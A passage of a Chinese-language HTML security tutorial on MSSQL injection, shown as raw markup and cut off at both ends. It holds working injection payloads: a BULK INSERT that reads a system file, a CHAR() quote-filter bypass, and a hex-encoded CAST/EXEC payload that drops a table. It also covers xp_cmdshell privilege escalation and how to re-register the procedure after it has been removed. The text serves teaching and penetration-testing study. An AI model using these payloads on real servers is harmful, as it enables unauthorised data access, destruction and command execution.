normal;background-color: rgb(255, 255, 255);"><span style="font-weight: bolder;font-size:14px;line-height:34px;;">文件</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-weight: bolder;font-size:14px;line-height:34px;;">查看文件权限</span></p><pre style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px;line-height:34px;;margin-top: 0px;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);background-color: rgb(255, 255, 255);"><code class="hljs sql" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: inherit;color: rgb(51, 51, 51);display: block;overflow-x: auto;padding: 0.5em;background: rgb(248, 248, 248);"><span style="font-size:14px;line-height:34px;;"><span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">CREATE</span>&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">TABLE</span>&nbsp;mydata&nbsp;(line&nbsp;<span class="hljs-built_in" style="font-size:14px;line-height:34px;;color: rgb(0, 134, 179);">varchar</span>(<span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">8000</span>));
BULK&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">INSERT</span>&nbsp;mydata&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">FROM</span>&nbsp;‘c:boot.ini’;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">DROP</span>&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">TABLE</span>&nbsp;mydata;</span></code></pre><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-weight: bolder;font-size:14px;line-height:34px;;">定位数据库文件</span></p><pre style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px;line-height:34px;;margin-top: 0px;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);background-color: rgb(255, 255, 255);"><code class="hljs coffeescript" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: inherit;color: rgb(51, 51, 51);display: block;overflow-x: auto;padding: 0.5em;background: rgb(248, 248, 248);"><span style="font-size:14px;line-height:34px;;">EXEC&nbsp;sp_helpdb&nbsp;master;&nbsp;–location&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">of</span>&nbsp;master.mdf</span></code></pre><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-weight: bolder;font-size:14px;line-height:34px;;">绕过技巧</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">这里讲绕过技巧的话其实很多和MySQL的绕过姿势都是类似的,就举几个常见的,其他的可以参见前面的MySQL注入攻击与防御</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-weight: bolder;font-size:14px;line-height:34px;;">绕过引号</span></p><pre style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px;line-height:34px;;margin-top: 0px;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);background-color: rgb(255, 255, 255);"><code class="hljs sql" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: inherit;color: rgb(51, 51, 51);display: block;overflow-x: auto;padding: 0.5em;background: rgb(248, 248, 248);"><span style="font-size:14px;line-height:34px;;"><span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">SELECT</span>&nbsp;*&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">FROM</span>&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">Users</span>&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">WHERE</span>&nbsp;username&nbsp;=&nbsp;<span class="hljs-built_in" style="font-size:14px;line-height:34px;;color: rgb(0, 134, 179);">CHAR</span>(<span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">97</span>)&nbsp;+&nbsp;<span class="hljs-built_in" style="font-size:14px;line-height:34px;;color: rgb(0, 134, 179);">CHAR</span>(<span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">100</span>)&nbsp;+&nbsp;<span class="hljs-built_in" style="font-size:14px;line-height:34px;;color: rgb(0, 134, 179);">CHAR</span>(<span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">109</span>)&nbsp;+&nbsp;<span class="hljs-built_in" style="font-size:14px;line-height:34px;;color: rgb(0, 134, 179);">CHAR</span>(<span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">105</span>)&nbsp;+&nbsp;<span class="hljs-built_in" style="font-size:14px;line-height:34px;;color: rgb(0, 134, 179);">CHAR</span>(<span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">110</span>)</span></code></pre><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-weight: bolder;font-size:14px;line-height:34px;;">16进制转换绕过</span></p><pre style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px;line-height:34px;;margin-top: 0px;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);background-color: rgb(255, 255, 255);"><code class="hljs sql" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: inherit;color: rgb(51, 51, 51);display: block;overflow-x: auto;padding: 0.5em;background: rgb(248, 248, 248);"><span style="font-size:14px;line-height:34px;;">'&nbsp;AND&nbsp;1=0;&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">DECLARE</span>&nbsp;@S&nbsp;<span class="hljs-built_in" style="font-size:14px;line-height:34px;;color: rgb(0, 134, 179);">VARCHAR</span>(<span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">4000</span>)&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">SET</span>&nbsp;@S=<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">CAST</span>(<span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">0x44524f50205441424c4520544d505f44423b</span>&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">AS</span>&nbsp;<span class="hljs-built_in" style="font-size:14px;line-height:34px;;color: rgb(0, 134, 179);">VARCHAR</span>(<span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">4000</span>));&nbsp;EXEC&nbsp;(@S);<span class="hljs-comment" style="font-size:14px;line-height:34px;;color: rgb(153, 153, 136);font-style: italic;">--</span></span></code></pre><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;font-weight: bolder;">MSSQL提权</span><br  /></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">这里先推荐一个工具</span><span style="font-weight: bolder;font-size:14px;line-height:34px;;">PowerUpSQL[https://github.com/NetSPI/PowerUpSQL]</span><span style="font-size:14px;line-height:34px;;">,主要用于对SQL Server的攻击,还能快速清点内网中SQL Server的机器,更多的信息可以到GitHub上查看使用.</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">其次下面主要讲的一些提权姿势为存储过程提权,想要查看数据库中是否有对应的存储过程,可以用下面的语句:</span></p><pre style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px;line-height:34px;;margin-top: 0px;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);background-color: rgb(255, 255, 255);"><code class="hljs sql" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: inherit;color: rgb(51, 51, 51);display: block;overflow-x: auto;padding: 0.5em;background: rgb(248, 248, 248);"><span style="font-size:14px;line-height:34px;;"><span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">select</span>&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">count</span>(*)&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">from</span>&nbsp;master.dbo.sysobjects&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">where</span>&nbsp;xtype=<span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 68);">'x'</span>&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">and</span>&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">name</span>=<span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 68);">'xp_cmdshell'</span></span></code></pre><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">或者查询对应数据库中定义的存储过程有哪些:</span></p><pre style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px;line-height:34px;;margin-top: 0px;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);background-color: rgb(255, 255, 255);"><code class="hljs sql" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: inherit;color: rgb(51, 51, 51);display: block;overflow-x: auto;padding: 0.5em;background: rgb(248, 248, 248);"><span style="font-size:14px;line-height:34px;;"><span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">SELECT</span>&nbsp;ROUTINE_CATALOG,SPECIFIC_SCHEMA,ROUTINE_NAME,ROUTINE_DEFINITION<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">FROM</span>&nbsp;MASTER.INFORMATION_SCHEMA.ROUTINES<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">ORDER</span>&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">BY</span>&nbsp;ROUTINE_NAME</span></code></pre><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-weight: bolder;font-size:14px;line-height:34px;;">xp_cmdshell</span></p><pre style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px;line-height:34px;;margin-top: 0px;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);background-color: rgb(255, 255, 255);"><code class="hljs nginx" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: inherit;color: rgb(51, 51, 51);display: block;overflow-x: auto;padding: 0.5em;background: rgb(248, 248, 248);"><span style="font-size:14px;line-height:34px;;"><span class="hljs-attribute" style="font-size:14px;line-height:34px;;color: rgb(0, 0, 128);">EXEC</span>&nbsp;master.dbo.xp_cmdshell&nbsp;<span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 68);">'cmd'</span>;</span></code></pre><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">最为经典的就是这个组件了,但是2005之后就默认关闭,而且现在来说都会把这个扩展删除掉</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;text-indent: 0em;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;"><span style="top: auto;left: auto;margin: 12px 279.2px;right: auto;bottom: auto;font-size:14px;line-height:34px;;"><img class="" data-ratio="0.24129353233830847" src="图片/HACK学习呀_2018-12-10_干货MSSQL注入攻击与防御/8_ibvcA8ZiaSvlXEtwtHunUPVNhQbmBg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibOskrUKLMf9zJEoniaQ99DeCdTfZhHaugSA84qVqWvwnV2mnKibvcA8ZiaSvlXEtwtHunUPVNhQbmBg/640?wx_fmt=png'" data-type="png" data-w="804" style="vertical-align: middle;border-style: none;display: block;margin: 0px;" title="t011daf22f43b34388d.png"  /></span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">因为xp_cmdshell用得最多,这里就xp_cmdshell使用过程中可能遇到的和网上收集问题列举一下:</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">首先说明一下,下面用到的addextendedproc的时候是没有开启的,试了一些语句,下面的语句可以创建一个存储过程:</span></p><pre style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px;line-height:34px;;margin-top: 0px;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);background-color: rgb(255, 255, 255);"><code class="hljs sql" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: inherit;color: rgb(51, 51, 51);display: block;overflow-x: auto;padding: 0.5em;background: rgb(248, 248, 248);"><span style="font-size:14px;line-height:34px;;"><span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">use</span>&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">mastergocreate</span>&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">procedure</span>&nbsp;sp_addextendedproc
@functname&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">nvarchar</span>(<span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">517</span>),
@dllname&nbsp;<span class="hljs-built_in" style="font-size:14px;line-height:34px;;color: rgb(0, 134, 179);">varchar</span>(<span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">255</span>)<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">asset</span>&nbsp;implicit_transactions&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">offif</span>&nbsp;@@trancount&nbsp;&gt;&nbsp;<span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">0</span><span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">begin</span>raiserror(<span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">15002</span>,<span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">-1</span>,<span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">-1</span>,<span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 68);">'sp_addextendedproc'</span>)<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">return</span>&nbsp;(<span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">1</span>)<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">end</span>dbcc&nbsp;addextendedproc(&nbsp;@functname,&nbsp;@dllname)<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">return</span>&nbsp;(<span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">0</span>)</span></code></pre><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">1.&nbsp;未能找到存储过程'master..xpcmdshell'.</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">恢复方法：</span></p><pre style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px;line-height:34px;;margin-top: 0px;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);background-color: rgb(255, 255, 255);"><code class="hljs java" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: inherit;color: rgb(51, 51, 51);display: block;overflow-x: auto;padding: 0.5em;background: rgb(248, 248, 248);"><span style="font-size:14px;line-height:34px;;">EXEC&nbsp;sp_addextendedproc&nbsp;xp_cmdshell,<span class="hljs-meta" style="font-size:14px;line-height:34px;;color: rgb(153, 153, 153);font-weight: bold;">@dllname</span>&nbsp;=<span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 68);">'xplog70.dll'</span>&nbsp;declare&nbsp;<span class="hljs-meta" style="font-size:14px;line-height:34px;;color: rgb(153, 153, 153);font-weight: bold;">@o</span>&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">int</span>&nbsp;
EXEC&nbsp;sp_addextendedproc&nbsp;<span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 68);">'xp_cmdshell'</span>,&nbsp;<span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 68);">'xpsql70.dll'</span></span></code></pre><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">2.&nbsp;无法装载 DLL xpsql70.dll 或该DLL所引用的某一 DLL。原因126（找不到指定模块。）</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">恢复方法：</span></p><pre style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px;line-height:34px;;margin-top: 0px;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);background-color: rgb(255, 255, 255);"><code class="hljs nginx" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: inherit;color: rgb(51, 51, 51);display: block;overflow-x: auto;padding: 0.5em;background: rgb(248, 248, 248);"><span style="font-size:14px;line-height:34px;;"><span class="hljs-attribute" style="font-size:14px;line-height:34px;;color: rgb(0, 0, 128);">EXEC</span>&nbsp;sp_dropextendedproc&nbsp;<span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 68);">"xp_cmdshell"</span>EXEC&nbsp;sp_addextendedproc&nbsp;<span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 68);">'xp_cmdshell'</span>,&nbsp;<span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 68);">'xpsql70.dll'</span></span></code></pre><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">3.&nbsp;无法在库 xpweb70.dll 中找到函数 xp_cmdshell。原因: 127(找不到指定的程序。)</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">恢复方法：</span></p><pre style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px;line-height:34px;;margin-top: 0px;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);background-color: rgb(255, 255, 255);"><code class="hljs bash" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: inherit;color: rgb(51, 51, 51);display: block;overflow-x: auto;padding: 0.5em;background: rgb(248, 248, 248);"><span style="font-size:14px;line-height:34px;;"><span class="hljs-built_in" style="font-size:14px;line-height:34px;;color: rgb(0, 134, 179);">exec</span>&nbsp;sp_dropextendedproc&nbsp;<span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 68);">'xp_cmdshell'</span><span class="hljs-built_in" style="font-size:14px;line-height:34px;;color: rgb(0, 134, 179);">exec</span>&nbsp;sp_addextendedproc&nbsp;<span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 68);">'xp_cmdshell'</span>,<span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 68);">'xpweb70.dll'</span></span></code></pre><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">4. SQL Server 阻止了对组件 'xp_cmdshell' 的 过程'sys.xp_cmdshell' 的访问，因为此组件已作为此服务器安全配置的一部分而被关闭。系统管理员可以通过使用 sp_configure 启用 'xp_cmdshell'。有关启用 'xp_cmdshell' 的详细信息，请参阅 SQL Server 联机丛书中的 "外围应用配置器"。</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">恢复方法：</span></p><pre style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px;line-height:34px;;margin-top: 0px;margin-bottom: 1rem;overflow: 